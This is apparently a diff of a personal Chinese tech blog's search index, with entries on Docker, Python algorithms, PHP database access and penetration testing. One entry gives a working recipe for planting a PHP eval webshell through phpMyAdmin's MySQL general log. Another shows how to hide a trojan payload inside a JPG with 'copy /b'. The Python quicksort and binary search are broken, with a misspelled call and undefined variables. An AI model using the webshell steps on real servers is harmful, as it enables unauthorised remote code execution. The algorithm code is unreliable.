@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[博客标题]]></title>
+    <url>%2F2019%2F12%2F25%2Fdocker%2F</url>
+    <content type="text"><![CDATA[docker常用命令123456789docker search [镜像名] //搜索镜像docker pull [镜像名] //下载镜像docker images //查看已下载的镜像docker ps -a //查看所有容器docker stop [容器名] //停止容器docker stop $(docker ps -aq) //停止容器docker rm [容器名] //删除容器docker rmi [镜像名] //删除镜像docker run [容器名] IMAGE //创建容器 run命令详解见:https://www.cnblogs.com/yfalcon/p/9044246.html docker搭建中的问题IPv4 forwarding is disabled. Networking will not work12345678910111213修改/etc/sysctl.conf或者/usr/lib/sysctl.d/00-system.conf添加如下代码：net.ipv4.ip_forward=1然后重启网络：systemctl restart network查看是否添加成功：sysctl net.ipv4.ip_forward输出为1时证明成功在宿主机上执行：net.ipv4.ip_forward=1 &gt;&gt; /usr/lib/sysctl.d/00-system.conf重启network和docker服务systemctl restart network &amp;&amp; systemctl restart docker 无法使用 systemctl 命令创建容器时加上：–privileged=true 1234567Centos 7docker run -tid --name test_1 --privileged=true /usr/sbin/initdocker exec -it test_1 /bin/bashUbunut 16.04docker run -tid --name test_2 --privileged=true /sbin/initdocker exec -it test_2 /bin/bash]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[算法(Python)]]></title>
     <url>%2F2019%2F09%2F10%2F%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%2F</url>
     <content type="text"><![CDATA[算法快速排序12345678def quicksort(arr): if len(arr)&lt;2: return arr else: j = arr[0] begin = [i for i in arr[1:] if i &lt;= j] end = [i for i in arr[1:] if i &gt; j] return quciksort(begin) + j + quicksort(end) 二分查找123456789101112def find(arr,itme): low = 0 high = len(arr) - 1 while(low &lt;= high): mid = int((end-begin)/2) guess = arr[mid] if guess == itme: return mid if guess &gt; itme: high = mid - 1 else: low = mid + 1]]></content>
@@ -132,6 +143,17 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[图片马制作]]></title>
+    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
+    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>木马</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[phpmyadmin通过日志文件拿webshell]]></title>
     <url>%2F2019%2F08%2F12%2Fphpmyadmin%E9%80%9A%E8%BF%87%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%8B%BFwebshell%2F</url>
     <content type="text"><![CDATA[前提: root用户 思路: general log设置为ON 利用mysql的一个日志文件 这个日志文件会记录执行过的sql语句 将这个日志文件修改为.php文件保存 然后执行一条一句话的sql语句 使用菜刀连接即可 三句话 set global general_log=’on’; SET global general_log_file=’C:/webshell/www/cmd.php’; SELECT ‘&lt;?php @eval($_POST[‘cmd’]);?&gt;‘;]]></content>
@@ -141,17 +163,6 @@
       <tags>
         <tag>phpmyadmin</tag>
         <tag>Webshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[图片马制作]]></title>
-    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
-    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>木马</tag>
       </tags>
   </entry>
   <entry>
@@ -178,20 +189,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[PHP-PDO]]></title>
-    <url>%2F2019%2F07%2F10%2FPHP-PDO%2F</url>
-    <content type="text"><![CDATA[开启PDOWindows 修改php.ini配置文件 添加 extension=php_pdo.dll Linux 添加扩展 extension=pdo.so 实例连接1234567891011121314151617181920212223242526&lt;?php$dbms=&apos;mysql&apos;; //数据库类型$host=&apos;localhost&apos;; //数据库主机名$dbName=&apos;test&apos;; //使用的数据库$user=&apos;root&apos;; //数据库连接用户名$pass=&apos;&apos;; //对应的密码$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try &#123; $conn = new PDO($dsn, $user, $pass); //初始化一个PDO对象 echo &quot;连接成功&lt;br/&gt;&quot;; /*你还可以进行一次搜索操作 foreach ($conn-&gt;query(&apos;SELECT * from FOO&apos;) as $row) &#123; print_r($row); //你可以用 echo($GLOBAL); 来看到这些值 &#125; */ $conn = null;&#125; catch (PDOException $e) &#123; die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);&#125;//默认这个不是长连接，如果需要数据库长连接//需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true)//变成这样：$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));?&gt; 查询1234567$sql = &quot;SELECT * FROM user WHERE username = ? and password = ?&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$row = $stmt -&gt; fetchAll(); 添加数据1234567$sql = &quot;INSERT INTO user(username,password) VALUES(?,?)&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$count &gt; 0 //添加成功]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Mysql</tag>
-        <tag>函数</tag>
-        <tag>PHP</tag>
-        <tag>PDO</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[PHP连接MySql]]></title>
     <url>%2F2019%2F07%2F10%2FPHP%E8%BF%9E%E6%8E%A5MySql%2F</url>
     <content type="text"><![CDATA[mysqli =&gt; mysql improve函数123456789101112131415161718192021$conn=mysqli_connect() //连接数据库mysqli_connect_errno() //获取数据库连接错误号mysqli_connect_error //获取数据库连接错误信息$result=mysqli_query($con,$sql) //执行查询语句mysqli_num_rows //获取查询结果的记录数musqli_affected_rows //获取更新或删除或插入语句影响的记录数mysqli_fetch_assoc //把查询结果集中的一条记录读取为关联数组mysqli_close //关闭数据库连接$row = mysqli_fetch_assoc($result) //将查询结果集保存为关系型数组$row = mysqli_fetch_array($result) //将查询结果集保存为普通数组mysqli_free_result($result) //释放结果集]]></content>
@@ -214,6 +211,20 @@
       <tags>
         <tag>网络</tag>
         <tag>子网划分</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[PHP-PDO]]></title>
+    <url>%2F2019%2F07%2F10%2FPHP-PDO%2F</url>
+    <content type="text"><![CDATA[开启PDOWindows 修改php.ini配置文件 添加 extension=php_pdo.dll Linux 添加扩展 extension=pdo.so 实例连接1234567891011121314151617181920212223242526&lt;?php$dbms=&apos;mysql&apos;; //数据库类型$host=&apos;localhost&apos;; //数据库主机名$dbName=&apos;test&apos;; //使用的数据库$user=&apos;root&apos;; //数据库连接用户名$pass=&apos;&apos;; //对应的密码$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try &#123; $conn = new PDO($dsn, $user, $pass); //初始化一个PDO对象 echo &quot;连接成功&lt;br/&gt;&quot;; /*你还可以进行一次搜索操作 foreach ($conn-&gt;query(&apos;SELECT * from FOO&apos;) as $row) &#123; print_r($row); //你可以用 echo($GLOBAL); 来看到这些值 &#125; */ $conn = null;&#125; catch (PDOException $e) &#123; die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);&#125;//默认这个不是长连接，如果需要数据库长连接//需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true)//变成这样：$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));?&gt; 查询1234567$sql = &quot;SELECT * FROM user WHERE username = ? and password = ?&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$row = $stmt -&gt; fetchAll(); 添加数据1234567$sql = &quot;INSERT INTO user(username,password) VALUES(?,?)&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$count &gt; 0 //添加成功]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Mysql</tag>
+        <tag>函数</tag>
+        <tag>PHP</tag>
+        <tag>PDO</tag>
       </tags>
   </entry>
   <entry>
